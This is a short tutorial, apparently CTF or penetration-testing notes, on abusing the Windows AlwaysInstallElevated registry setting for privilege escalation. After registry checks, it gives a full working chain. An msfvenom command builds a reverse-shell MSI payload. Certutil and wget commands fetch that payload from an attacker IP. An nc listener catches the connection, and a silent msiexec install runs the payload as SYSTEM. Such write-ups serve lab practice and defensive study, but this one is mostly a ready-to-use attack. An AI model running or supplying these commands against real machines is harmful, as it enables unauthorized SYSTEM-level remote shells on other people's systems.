

## 📖 What is `AlwaysInstallElevated`?

Windows has two registry keys that, when both set to `1`, allow **any user** to run `.msi` installer files **with SYSTEM privileges**.
Windows has these 2 keys:
```
HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```
If both are set to `1`, **any user can install MSI packages with SYSTEM privileges**.


#### **📍 Check if the system is vulnerable**

Run the following commands **on the target machine**:

> **reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated**
> 
> **reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated**

**Vulnerable** if both return:

`AlwaysInstallElevated REG_DWORD 0x1`

#### **📍 Step 1: Generate a malicious MSI payload**

On your **attacker machine (Kali/Parrot):**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=445 -f msi > shell.msi
```

- `-p`: Payload type (`shell_reverse_tcp`)
- `LHOST`: Your attack machine’s IP (typically `tun0` in VPNs like HackTheBox)
- `LPORT`: The port you’ll listen on
- `-f msi`: Output format is an MSI installer

This creates a file `shell.msi` that will **connect back to you as SYSTEM** when installed.

#### **📍 Step 2: Transfer the MSI to the victim**

On the victim’s **PowerShell**:
```bash
# wget 
wget http://<YOUR-IP>/shell.msi -o shell.msi

# certutil
certutil -urlcache -split -f "http://10.17.68.184:8000/shell.msi" shell.msi
```

📍 Step 3: Install the MSI with SYSTEM privileges
on Attacker machine run 
```
rlwrap -f . -r nc -lvnp 445
```

on target machine run it
```bash
msiexec /quiet /qn /i C:\Temp\shell.msi
```

- `msiexec`: The Windows Installer program
- `/quiet /qn`: No user interface
- `/i`: Install the MSI

Since **AlwaysInstallElevated is enabled**, this **runs as SYSTEM** even from a low-privileged account.